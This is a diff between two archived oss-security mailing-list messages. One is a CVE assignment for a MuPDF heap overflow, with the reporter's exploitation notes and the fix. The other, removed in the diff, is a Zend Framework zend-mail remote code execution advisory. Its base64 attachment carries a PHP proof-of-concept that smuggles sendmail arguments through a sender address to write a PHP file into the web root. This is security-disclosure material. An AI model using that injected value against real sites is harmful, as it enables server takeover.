@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["12659" "Friday" "30" "December" "2016" "14:02:07" "-0200" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzssrDfG2UtGBxVEhS=M5AC7jgufh6GeVKQb6xZGBP9DO1Q@mail.gmail.com>" "231" "[oss-security] Zend Framework (zend-mail) < 2.4.11 Remote Code Execution (CVE-2016-10034)" nil nil nil "12" "2016123016:02:07" "[oss-security] Zend Framework (zend-mail) < 2.4.11 Remote Code Execution (CVE-2016-10034)" (number mark "U       dawid@legalh Dec 30  231/12659 " thread-indent "\"[oss-security] Zend Framework (zend-mail) < 2.4.11 Remote Code Execution (CVE-2016-10034)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2017" "Wednesday" "3" "August" "2016" "08:16:04" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160803121604.097D66C19BE@smtpvmsrv1.mitre.org>" "52" "[oss-security] Re: CVE request:Heap overflow vulns in MuPDF" nil nil nil "8" "2016080312:16:04" "[oss-security] Re: CVE request:Heap overflow vulns in MuPDF" (number mark "U       cve-assign@m Aug  3   52/2017  " thread-indent "\"[oss-security] Re: CVE request:Heap overflow vulns in MuPDF\"\n") "<CAPGxrc9YpXo-DHd-oSOker5MhCAH1QoCW-6O4JE+pZScG79vng@mail.gmail.com>" ("<CAPGxrc9YpXo-DHd-oSOker5MhCAH1QoCW-6O4JE+pZScG79vng@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7895 invoked by uid 550); 30 Dec 2016 16:11:19 -0000
+Received: (qmail 5255 invoked by uid 550); 3 Aug 2016 12:16:16 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,266 +12,64 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3818 invoked from network); 30 Dec 2016 16:02:19 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=GHnpetr3sU0X4w84tO1T3Qa8xqpbgQVCjoapxT4evyo=;
-        b=N9GiTkYKY6yvRqFTtmd97LMgcmboB93Nx8MQ+TXSsLrvvGnmFq0JAVKiystdvcwJnI
-         TAyonziYbuAKrNUvGsFxCMkKYfjPO7D4Wl5BawRf5jhplj++AL6hIBz3r0c2TmBUBpES
-         r2fYSly3EQNjnTaU1txLoVf8qifHwm9kwSokcYk4IC4+daiJ9XByhGh0efsNMWpHIJMH
-         aBYJBaaE9oSqvsqgVcvoWqymqVO5yPPC+F2RNiYskGrMGvthwxSOkpOHJ4H8z1fLaZbT
-         OGZ5xYvZwLLHxetpAUrS7Hs5icOo83gC3Fv09gR3eYwcxIWNYP5JwrvCFu7ZgMDdy0Hx
-         +/tw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=GHnpetr3sU0X4w84tO1T3Qa8xqpbgQVCjoapxT4evyo=;
-        b=A6IiO34Ef3PRNr9EzWm/PWvJAo7bPf0ea4V6Jdkar4s2ULbS4dnq8f7Hpi6EEeFyGX
-         nnr4Z6i5Jj0GVODvLChx8cQRiEBjk2JzrD1ECfFFfHp6/i4hzUb9AEk56ECgGI5Ny+aC
-         IN8BCexlC+YkFolHJY7icaVd0srD2dYA0KuJcZ/VLh2pVlcZJKJAahAOsCpyN/YVScjw
-         JYr7bSoYUs0xohmCSYWT4O13XalajWP98lzjYu7Gh8BdVNnenoYvhFDYNDXzBlsC6ynV
-         u+A98Om15W+ZtBBnxcONZLMjaceYsFfHZ6VBstzNlVNs/mnperX3h3cOdBv8GfRtPe9G
-         UV7A==
-X-Gm-Message-State: AIkVDXKW+TRKs8MGzr6m6xN/NrAqaysoQqk3H+GFm/XtTIiKUgI1fTsjkpiZbBGT0/PU3zMElXdH8mkGS5tyNQ==
-X-Received: by 10.176.4.38 with SMTP id 35mr24003496uav.15.1483113727806; Fri,
- 30 Dec 2016 08:02:07 -0800 (PST)
-MIME-Version: 1.0
-From: Dawid Golunski <dawid@legalhackers.com>
-Date: Fri, 30 Dec 2016 14:02:07 -0200
-Message-ID: <CADSYzssrDfG2UtGBxVEhS=M5AC7jgufh6GeVKQb6xZGBP9DO1Q@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/mixed; boundary=001a114f5d7ce886610544e2521a
-Subject: [oss-security] Zend Framework (zend-mail) < 2.4.11 Remote Code Execution (CVE-2016-10034)
+Received: (qmail 5233 invoked from network); 3 Aug 2016 12:16:16 -0000
+From: cve-assign@mitre.org
+To: rootredrain@gmail.com
+Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
+In-Reply-To: <CAPGxrc9YpXo-DHd-oSOker5MhCAH1QoCW-6O4JE+pZScG79vng@mail.gmail.com>
+Message-Id: <20160803121604.097D66C19BE@smtpvmsrv1.mitre.org>
+Date: Wed,  3 Aug 2016 08:16:04 -0400 (EDT)
+Subject: [oss-security] Re: CVE request:Heap overflow vulns in MuPDF
 
---001a114f5d7ce886610544e2521a
-Content-Type: text/plain; charset=UTF-8
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Zend Framework / zend-mail < 2.4.11    Remote Code Execution (CVE-2016-10034)
-zend-mail < 2.7.2
+> The location of this vulnerability is at pdf_load_mesh_params function, at
+> source/pdf/pdf-shade.c
+> 
+> n = (pdf_array_len(ctx, obj) - 4) / 2;
+> 
+> the length of array return from pdf_array_len not be checked. But the
+> max size of "shade->u.m.C0/C1" is defined as a macro(32 as default). So if
+> I make a pdf which have a large decode array. This code will cause a heap
+> overflow.
+> 
+> And the overflow data could be control, And on the memory I overflow, I
+> found a struct which full of function point. Maybe I can let it point to
+> got table for a chance to call "system"
+> 
+> issue:
+> http://bugs.ghostscript.com/show_bug.cgi?id=696954
+> 
+> fix code:
+> http://git.ghostscript.com/?p=mupdf.git;h=39b0f07dd960f34e7e6bf230ffc3d87c41ef0f2e
 
-Discovered by Dawid Golunski (@dawid_golunski)
-https://legalhackers.com
+>> Make sure that number of colors in mesh params is valid.
 
-Desc:
-An independent research uncovered a critical vulnerability in zend-mail, a
-Zend Framework's component that could potentially be used by (unauthenticated)
-remote attackers to achieve remote arbitrary code execution in the context
-of the web server user and remotely compromise the target web application.
+>> -               n = (pdf_array_len(ctx, obj) - 4) / 2;
+>> +               n = fz_mini(FZ_MAX_COLORS, (pdf_array_len(ctx, obj) - 4) / 2);
 
-To exploit the vulnerability an attacker could target common website
-components such as contact/feedback forms, registration forms, password
-email resets and others that send out emails with the help of a vulnerable
-version of the zend-mail class.
+Use CVE-2016-6525.
 
-The latest full advisory / PoC exploit at:
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-http://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html
-
-Video / PoC:
-
-https://legalhackers.com/videos/ZendFramework-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10034-PoC.html
-
-For updates, follow:
-
-https://twitter.com/dawid_golunski
-
-
---
-Regards,
-Dawid Golunski
-https://legalhackers.com
-t: @dawid_golunski
-
---001a114f5d7ce886610544e2521a
-Content-Type: text/plain; charset=US-ASCII; name="zend.txt"
-Content-Disposition: attachment; filename="zend.txt"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: f_ixbzk54n0
-
-CgoKCgogICAgX18gICAgICAgICAgICAgICAgICAgICBfXyAgIF9fICBfXyAg
-ICAgICAgICAgX18gICAgICAgICAgICAgICAgIAogICAvIC8gICBfX18gIF9f
-X18gX19fX18gXy8gLyAgLyAvIC8gL19fXyBfX19fX18vIC9fX19fXyAgX19f
-X19fX19fXwogIC8gLyAgIC8gXyBcLyBfXyBgLyBfXyBgLyAvICAvIC9fLyAv
-IF9fIGAvIF9fXy8gLy9fLyBfIFwvIF9fXy8gX19fLwogLyAvX19fLyAgX18v
-IC9fLyAvIC9fLyAvIC8gIC8gX18gIC8gL18vIC8gL19fLyAsPCAvICBfXy8g
-LyAgKF9fICApIAovX19fX18vXF9fXy9cX18sIC9cX18sXy9fLyAgL18vIC9f
-L1xfXyxfL1xfX18vXy98X3xcX19fL18vICAvX19fXy8gIAogICAgICAgICAg
-IC9fX19fLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgIAoKCgoKPT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09Ci0gRGlzY292ZXJlZCBieTogRGF3aWQgR29s
-dW5za2kKLSBkYXdpZFthdF1sZWdhbGhhY2tlcnMuY29tCi0gaHR0cHM6Ly9s
-ZWdhbGhhY2tlcnMuY29tCgotIENWRS0yMDE2LTEwMDM0Ci0gUmVsZWFzZSBk
-YXRlOiAgMzAuMTIuMjAxNgotIExhc3QgcmV2aXNpb246IDMwLjEyLjIwMTYK
-LSBSZXZpc2lvbiAxLjAKLSBTZXZlcml0eTogQ3JpdGljYWwKPT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgoKSS4gVlVM
-TkVSQUJJTElUWQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpaZW5kIEZy
-YW1ld29yayA8IDIuNC4xMSAgICBSZW1vdGUgQ29kZSBFeGVjdXRpb24gKENW
-RS0yMDE2LTEwMDM0KQp6ZW5kLW1haWwgPCAyLjQuMTEgCnplbmQtbWFpbCA8
-IDIuNy4yIAoKCklJLiBCQUNLR1JPVU5ECi0tLS0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0KCgoiWmVuZCBGcmFtZXdvcmsgaXMgYSBjb2xsZWN0aW9uIG9mIHBy
-b2Zlc3Npb25hbCBQSFAgcGFja2FnZXMgd2l0aCBtb3JlIHRoYW4gOTUKbWls
-bGlvbiBpbnN0YWxsYXRpb25zLiBJdCBjYW4gYmUgdXNlZCB0byBkZXZlbG9w
-IHdlYiBhcHBsaWNhdGlvbnMgYW5kIApzZXJ2aWNlcyB1c2luZyBQSFAgNS42
-KywgYW5kIHByb3ZpZGVzIDEwMCUgb2JqZWN0LW9yaWVudGVkIGNvZGUgdXNp
-bmcgYSBicm9hZCAKc3BlY3RydW0gb2YgbGFuZ3VhZ2UgZmVhdHVyZXMuCgpa
-ZW5kIEZyYW1ld29yayAzIGV2b2x2ZWQgZnJvbSBib3RoIFplbmQgRnJhbWV3
-b3JrIDIgYW5kIDE7IGN1bXVsYXRpdmVseSwgCnRoZSBwcmV2aW91cyB2ZXJz
-aW9ucyB3ZXJlIGRvd25sb2FkZWQgbW9yZSB0aGFuIDE1IG1pbGxpb24gdGlt
-ZXMuCgpUaGUgcHJpbmNpcGFsIHNwb25zb3Igb2YgWmVuZCBGcmFtZXdvcmsg
-aXMgWmVuZCwgYSBSb2d1ZSBXYXZlIENvbXBhbnksIGJ1dCAKbWFueSBvdGhl
-cnMgaGF2ZSBjb250cmlidXRlZCBjb21wb25lbnRzIG9yIHNpZ25pZmljYW50
-IGZlYXR1cmVzIHRvIHRoZSAKZnJhbWV3b3JrLiBDb21wYW5pZXMgc3VjaCBh
-cyBHb29nbGUsIE1pY3Jvc29mdCwgYW5kIFN0cmlrZUlyb24gaGF2ZSAKcGFy
-dG5lcmVkIHdpdGggWmVuZCB0byBwcm92aWRlIGludGVyZmFjZXMgdG8gd2Vi
-IHNlcnZpY2VzIGFuZCBvdGhlciAKdGVjaG5vbG9naWVzIHRoZXkgd2lzaCB0
-byBtYWtlIGF2YWlsYWJsZSB0byBaRiBkZXZlbG9wZXJzLiIKCmh0dHBzOi8v
-ZnJhbWV3b3JrLnplbmQuY29tL2Fib3V0CgpodHRwczovL2dpdGh1Yi5jb20v
-emVuZGZyYW1ld29yay96ZW5kZnJhbWV3b3JrCgpJSUkuIElOVFJPRFVDVElP
-TgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpBbiBpbmRlcGVuZGVudCBy
-ZXNlYXJjaCB1bmNvdmVyZWQgYSBjcml0aWNhbCB2dWxuZXJhYmlsaXR5IGlu
-IHplbmQtbWFpbCwgYSAKWmVuZCBGcmFtZXdvcmsncyBjb21wb25lbnQgdGhh
-dCBjb3VsZCBwb3RlbnRpYWxseSBiZSB1c2VkIGJ5ICh1bmF1dGhlbnRpY2F0
-ZWQpCnJlbW90ZSBhdHRhY2tlcnMgdG8gYWNoaWV2ZSByZW1vdGUgYXJiaXRy
-YXJ5IGNvZGUgZXhlY3V0aW9uIGluIHRoZSBjb250ZXh0IApvZiB0aGUgd2Vi
-IHNlcnZlciB1c2VyIGFuZCByZW1vdGVseSBjb21wcm9taXNlIHRoZSB0YXJn
-ZXQgd2ViIGFwcGxpY2F0aW9uLgoKVG8gZXhwbG9pdCB0aGUgdnVsbmVyYWJp
-bGl0eSBhbiBhdHRhY2tlciBjb3VsZCB0YXJnZXQgY29tbW9uIHdlYnNpdGUK
-Y29tcG9uZW50cyBzdWNoIGFzIGNvbnRhY3QvZmVlZGJhY2sgZm9ybXMsIHJl
-Z2lzdHJhdGlvbiBmb3JtcywgcGFzc3dvcmQKZW1haWwgcmVzZXRzIGFuZCBv
-dGhlcnMgdGhhdCBzZW5kIG91dCBlbWFpbHMgd2l0aCB0aGUgaGVscCBvZiBh
-IHZ1bG5lcmFibGUKdmVyc2lvbiBvZiB0aGUgemVuZC1tYWlsIGNsYXNzLgoK
-Tm90ZTogVGhpcyBhZHZpc29yeSBpcyBsaW1pdGVkLgpSZW1haW5pbmcgYXR0
-YWNrIHZlY3RvcnMvZXhwbG9pdHMgd2lsbCBiZSBkaXNjbG9zZWQgYXQgYSBs
-YXRlciBkYXRlIHRvIGFsbG93Cm1vcmUgdGltZSBmb3IgcGF0Y2hpbmcuCgpJ
-Vi4gREVTQ1JJUFRJT04KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKemVu
-ZC1tYWlsIGNvbXBvbmVudCBvZiBaZW5kIEZyYW1ld29yaywgc3VmZmVycyBm
-cm9tIHRoZSBzYW1lIHZ1bG5lcmFiaWxpdHkgYXMgCnRoZSBvbmVzIGRpc2Ns
-b3NlZCBpbiBQSFBNYWlsZXIgYW5kIFN3aWZ0TWFpbGVyOgoKaHR0cHM6Ly9s
-ZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvUEhQTWFpbGVyLUV4cGxvaXQt
-UmVtb3RlLUNvZGUtRXhlYy1DVkUtMjAxNi0xMDAzMy1WdWxuLmh0bWwKCmh0
-dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1N3aWZ0TWFpbGVy
-LUV4cGxvaXQtUmVtb3RlLUNvZGUtRXhlYy1DVkUtMjAxNi0xMDA3NC1WdWxu
-Lmh0bWwKCklmIGEgd2ViIGFwcGxpY2F0aW9uIGJhc2VkIG9uIFplbmQgRnJh
-bWV3b3JrIHBhc3NlcyBhbiB1bnRydXN0ZWQgaW5wdXQgdG8gCnNldEZyb20o
-KSBmdW5jdGlvbiBvZiB0aGUgemVuZC1tYWlsJ3MgU2VuZG1haWwgdHJhbnNw
-b3J0LCBhbiBhdHRhY2tlciBjb3VsZAppbmplY3QgYWRkaXRpb25hbCBwYXJh
-bWV0ZXJzIHRvIFNlbmRtYWlsIHByb2dyYW0uCgpCeSBpbmplY3RpbmcgYW4g
-ZXh0cmEgc2VxdWVuY2Ugb2YgXCIgYWZ0ZXIgdGhlIGZpcnN0IGFyZ3VtZW50
-LCB0aGUgZm9sbG93aW5nIGVtYWlsOgoKIkF0dGFja2VyIFwiIC1QYXJhbTIg
-LVBhcmFtMyJAdGVzdC5jb20KCndoZW4gcGFzc2VkIHRvIHplbmQtbWFpbCdz
-IFNlbmRtYWlsIHRyYW5zcG9ydCAoYW5kIGV2ZW50dWFsbHkgdG8gbWFpbCgp
-KSBmdW5jdGlvbiAKd291bGQgY2F1c2Ugc2VuZG1haWwgdG8gZXhlY3V0ZSB3
-aXRoOgoKQXJnIG5vLiAwID09IFsvdXNyL3NiaW4vc2VuZG1haWxdCkFyZyBu
-by4gMSA9PSBbLXRdCkFyZyBuby4gMiA9PSBbLWldCkFyZyBuby4gMyA9PSBb
-LWZBdHRhY2tlclxdCkFyZyBuby4gNCA9PSBbLVBhcmFtMl0KQXJnIG5vLiA1
-ID09IFstUGFyYW0zIkB0ZXN0LmNvbV0KCgpXaGljaCBhcyBjYW4gYmUgc2Vl
-biB3b3VsZCBpbmplY3QgYWRkaXRpb25hbCBwYXJhbWV0ZXJzIG9mIDQgJiA1
-IHRvIHNlbmRtYWlsLgoKCkF0dGFja2VycyBjYW4gZXhwbG9pdCB0aGlzIHRv
-IGFjaGlldmUgY29kZSBleGVjdXRpb24gYXMgc2hvd24gaW4gdGhlIFBvQwpi
-ZWxvdy4KCgoKVi4gUFJPT0YgT0YgQ09OQ0VQVCBFWFBMT0lUCi0tLS0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0KCjw/cGhwCiAKLyoKIApaZW5kIEZyYW1ld29y
-ayA8IDIuNC4xMSAgICBSZW1vdGUgQ29kZSBFeGVjdXRpb24gKENWRS0yMDE2
-LTEwMDM0KQp6ZW5kLW1haWwgPCAyLjQuMTEgCnplbmQtbWFpbCA8IDIuNy4y
-IAogCkRpc2NvdmVyZWQvQ29kZWQgYnk6CiAKRGF3aWQgR29sdW5za2kKaHR0
-cHM6Ly9sZWdhbGhhY2tlcnMuY29tCiAKRnVsbCBBZHZpc29yeSBVUkw6Cmh0
-dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1plbmRGcmFtZXdv
-cmstRXhwbG9pdC1aZW5kTWFpbC1SZW1vdGUtQ29kZS1FeGVjLUNWRS0yMDE2
-LTEwMDM0LVZ1bG4uaHRtbAoKVmlkZW8gUG9DCmh0dHBzOi8vbGVnYWxoYWNr
-ZXJzLmNvbS92aWRlb3MvWmVuZEZyYW1ld29yay1FeHBsb2l0LVJlbW90ZS1D
-b2RlLUV4ZWMtVnVsbi1DVkUtMjAxNi0xMDAzNC1Qb0MuaHRtbAoKCgpGb2xs
-b3cgdGhlIGZlZWQgZm9yIHVwZGF0ZXM6CgpodHRwczovL3R3aXR0ZXIuY29t
-L2Rhd2lkX2dvbHVuc2tpCgogCkEgc2ltcGxlIFBvQyAod29ya2luZyBvbiBT
-ZW5kbWFpbCBNVEEpCiAKSXQgd2lsbCBpbmplY3QgdGhlIGZvbGxvd2luZyBw
-YXJhbWV0ZXJzIHRvIHNlbmRtYWlsIGNvbW1hbmQ6CiAKQXJnIG5vLiAwID09
-IFsvdXNyL3NiaW4vc2VuZG1haWxdCkFyZyBuby4gMSA9PSBbLXRdCkFyZyBu
-by4gMiA9PSBbLWldCkFyZyBuby4gMyA9PSBbLXJdCkFyZyBuby4gNCA9PSBb
-YXR0YWNrZXJcXQpBcmcgbm8uIDUgPT0gWy1vUS90bXAvXQpBcmcgbm8uIDYg
-PT0gWy1YL3Zhci93d3cvY2FjaGUvcGhwY29kZS5waHBdCkFyZyBuby4gNyA9
-PSBbIkBlbWFpbC5jb21dCgoKCndoaWNoIHdpbGwgd3JpdGUgdGhlIHRyYW5z
-ZmVyIGxvZyAoLVgpIGludG8gL3Zhci93d3cvY2FjaGUvcGhwY29kZS5waHAg
-ZmlsZS4KTm90ZSAvdmFyL3d3dy9jYWNoZSBtdXN0IGJlIHdyaXRhYmxlIGJ5
-IHd3dy1kYXRhIHdlYiB1c2VyLgoKVGhlIHJlc3VsdGluZyBmaWxlIHdpbGwg
-Y29udGFpbiB0aGUgcGF5bG9hZCBwYXNzZWQgaW4gdGhlIGJvZHkgb2YgdGhl
-IG1zZzoKIAowOTYwNyA8PDwgQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNo
-YXJzZXQ9dXMtYXNjaWkKMDk2MDcgPDw8IAowOTYwNyA8PDwgPD9waHAgcGhw
-aW5mbygpOyA/PgowOTYwNyA8PDwgCjA5NjA3IDw8PCAKMDk2MDcgPDw8IAog
-CiAKU2VlIHRoZSBmdWxsIGFkdmlzb3J5IFVSTCBmb3IgdGhlIGV4cGxvaXQg
-ZGV0YWlscy4KIAoqLwogCiAKLy8gQXR0YWNrZXIncyBpbnB1dCBjb21pbmcg
-ZnJvbSB1bnRydXN0ZWQgc291cmNlIHN1Y2ggYXMgJF9HRVQgLCAkX1BPU1Qg
-ZXRjLgovLyBGb3IgZXhhbXBsZSBmcm9tIGEgQ29udGFjdCBmb3JtIHdpdGgg
-c2VuZGVyL2JvZHkgZmllbGRzCiAKJGVtYWlsX2Zyb20gPSAnImF0dGFja2Vy
-XCIgLW9RL3RtcC8gLVgvdmFyL3d3dy9jYWNoZS9waHBjb2RlLnBocCAiQGVt
-YWlsLmNvbSc7Ci8vIGVuY29kZWQgcGhwaW5mbygpIHBocCBjb2RlCiRtc2df
-Ym9keSA9IGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnY0dod2FXNW1ieWdwT3lB
-L1BnPT0iKTsKCgoKLy8gLS0tLS0tLS0tLS0tLS0tLS0tCiAKLy8gbWFpbCgp
-IHBhcmFtIGluamVjdGlvbiB2aWEgdGhlIHZ1bG5lcmFiaWxpdHkgaW4gemVu
-ZC1tYWlsCgoKY2hkaXIoZGlybmFtZShfX0RJUl9fKSk7CmluY2x1ZGUgJ3Zl
-bmRvci9aZW5kL0xvYWRlci9BdXRvbG9hZGVyRmFjdG9yeS5waHAnOwoKWmVu
-ZFxMb2FkZXJcQXV0b2xvYWRlckZhY3Rvcnk6OmZhY3RvcnkoYXJyYXkoCiAg
-ICAgICAgJ1plbmRcTG9hZGVyXFN0YW5kYXJkQXV0b2xvYWRlcicgPT4gYXJy
-YXkoCiAgICAgICAgICAgICAgICAnYXV0b3JlZ2lzdGVyX3pmJyA9PiB0cnVl
-CiAgICAgICAgKQopKTsKClplbmRcTXZjXEFwcGxpY2F0aW9uOjppbml0KHJl
-cXVpcmUgJ2NvbmZpZy9hcHBsaWNhdGlvbi5waHAnKS0+cnVuKCk7CgokbWVz
-c2FnZSAgICAgICAgPSBuZXcgXFplbmRcTWFpbFxNZXNzYWdlKCk7CgokbWVz
-c2FnZS0+c2V0Qm9keSgkbXNnX2JvZHkpOwokbWVzc2FnZS0+c2V0RnJvbSgk
-ZW1haWxfZnJvbSwgJ0F0dGFja2VyJyk7CiRtZXNzYWdlLT5hZGRUbygnc3Vw
-cG9ydEBsb2NhbGhvc3QnLCAnU3VwcG9ydCcpOwokbWVzc2FnZS0+c2V0U3Vi
-amVjdCgnWmVuZCBQb0MnKTsKCiR0cmFuc3BvcnQgID0gbmV3IFxaZW5kXE1h
-aWxcVHJhbnNwb3J0XFNlbmRtYWlsKCk7CiR0cmFuc3BvcnQtPnNlbmQoJG1l
-c3NhZ2UpOwoKCgoKCn5+fn5+fn5+fn5+CgpWaWRlbyBQb0M6Cn5+fn5+fn5+
-fn5+fn4KCmh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS92aWRlb3MvWmVuZEZy
-YW1ld29yay1FeHBsb2l0LVJlbW90ZS1Db2RlLUV4ZWMtVnVsbi1DVkUtMjAx
-Ni0xMDAzNC1Qb0MuaHRtbAoKCgpWSS4gQlVTSU5FU1MgSU1QQUNUCi0tLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0KCkEgc3VjY2Vzc2Z1bCBleHBsb2l0YXRp
-b24gY291bGQgbGV0IHJlbW90ZSBhdHRhY2tlcnMgdG8gZ2FpbiBhY2Nlc3Mg
-dG8gCnRoZSB0YXJnZXQgc2VydmVyIGluIHRoZSBjb250ZXh0IG9mIHRoZSB3
-ZWIgc2VydmVyIGFjY291bnQgd2hpY2ggY291bGQKbGVhZCB0byBhIGZ1bGwg
-Y29tcHJvbWlzZSBvZiB0aGUgd2ViIGFwcGxpY2F0aW9uLgoKIApWSUkuIFNZ
-U1RFTVMgQUZGRUNURUQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKVGhl
-IHBhdGNoIHJlc29sdmluZyB0aGUgdnVsbmVyYWJpbGl0eSBpcyBhdmFpbGFi
-bGUgaW46Cgp6ZW5kLW1haWwsIHN0YXJ0aW5nIGluIHZlcnNpb24gMi43LjIK
-emVuZC1tYWlsLCAyLjQuMTEKWmVuZCBGcmFtZXdvcmssIDIuNC4xMQoKClZJ
-SUkuIFNPTFVUSU9OIC8gVkVORE9SIFJFU1BPTlNFCi0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0KClVwZGF0ZSB0byB0aGUgbGF0ZXN0IHZlcnNpb25zIHRo
-YXQgY29udGFpbiB0aGUgcGF0Y2guCgpodHRwczovL2ZyYW1ld29yay56ZW5k
-LmNvbS9zZWN1cml0eS9hZHZpc29yeS9aRjIwMTYtMDQKCgpJWC4gUkVGRVJF
-TkNFUwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpodHRwczovL2xlZ2Fs
-aGFja2Vycy5jb20KClRoaXMgLyBDVkUtMjAxNi0xMDAzNCBhZHZpc29yeSBV
-Ukw6Cmh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1plbmRG
-cmFtZXdvcmstRXhwbG9pdC1aZW5kTWFpbC1SZW1vdGUtQ29kZS1FeGVjLUNW
-RS0yMDE2LTEwMDM0LVZ1bG4uaHRtbAoKVmlkZW8gUG9DOgpodHRwczovL2xl
-Z2FsaGFja2Vycy5jb20vdmlkZW9zL1plbmRGcmFtZXdvcmstRXhwbG9pdC1S
-ZW1vdGUtQ29kZS1FeGVjLVZ1bG4tQ1ZFLTIwMTYtMTAwMzQtUG9DLmh0bWwK
-CkV4cGxvaXQgY29kZToKVGhlIHNpbXBsZSBQb0Mgc2hvd24gYWJvdmUgaXMg
-YXZhaWxhYmxlIGhlcmU6Cmh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9leHBs
-b2l0cy9DVkUtMjAxNi0xMDAzNC96ZW5kLW1haWxfUG9DX1JDRV9FeHBsb2l0
-LnR4dAoKT3RoZXIgZXhwbG9pdHMgd2l0aCBvdGhlciBhdHRhY2sgdmVjdG9y
-cyB3aWxsIGJlIGRpc2Nsb3NlZCBhdCBhIGxhdGVyIGRhdGUgdG8gCmFsbG93
-IG1vcmUgdGltZSBmb3IgcGF0Y2hpbmcuCgpDVkUtMjAxNi0xMDAzNApodHRw
-czovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9jdmVuYW1lLmNnaT9uYW1lPUNW
-RS0yMDE2LTEwMDM0CgpWZW5kb3Igc2l0ZToKaHR0cHM6Ly9mcmFtZXdvcmsu
-emVuZC5jb20KCgpSZWxhdGVkIHZ1bG5lcmFiaWxpdGllcyAoZm91bmQgaW4g
-UEhQTWFpbGVyICYgU3dpZnRNYWlsZXIpOgoKaHR0cHM6Ly9sZWdhbGhhY2tl
-cnMuY29tL2Fkdmlzb3JpZXMvUEhQTWFpbGVyLUV4cGxvaXQtUmVtb3RlLUNv
-ZGUtRXhlYy1DVkUtMjAxNi0xMDAzMy1WdWxuLmh0bWwKaHR0cHM6Ly9sZWdh
-bGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvUEhQTWFpbGVyLUV4cGxvaXQtUmVt
-b3RlLUNvZGUtRXhlYy1DVkUtMjAxNi0xMDA0NS1WdWxuLVBhdGNoLUJ5cGFz
-cy5odG1sCmh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1N3
-aWZ0TWFpbGVyLUV4cGxvaXQtUmVtb3RlLUNvZGUtRXhlYy1DVkUtMjAxNi0x
-MDA3NC1WdWxuLmh0bWwKCgpYLiBDUkVESVRTCi0tLS0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0KClRoZSB2dWxuZXJhYmlsaXR5IGhhcyBiZWVuIGRpc2NvdmVy
-ZWQgYnkgRGF3aWQgR29sdW5za2kKZGF3aWQgKGF0KSBsZWdhbGhhY2tlcnMg
-KGRvdCkgY29tCgpodHRwczovL2xlZ2FsaGFja2Vycy5jb20KCgpUaGFua3Mg
-dG8gQmV5b25kIFNlY3VyaXR5J3MgU1NEIHByb2dyYW0gZm9yIGhlbHAgd2l0
-aCB0aGUgZGlzY2xvc3VyZSB0byB0aGUgdmVuZG9yLgogClhJLiBSRVZJU0lP
-TiBISVNUT1JZCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCjMwLjEyLjIw
-MTYgLSBMaW1pdGVkIGFkdmlzb3J5IHJlbGVhc2VkCiAKClhJSS4gTEVHQUwg
-Tk9USUNFUwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpUaGUgaW5mb3Jt
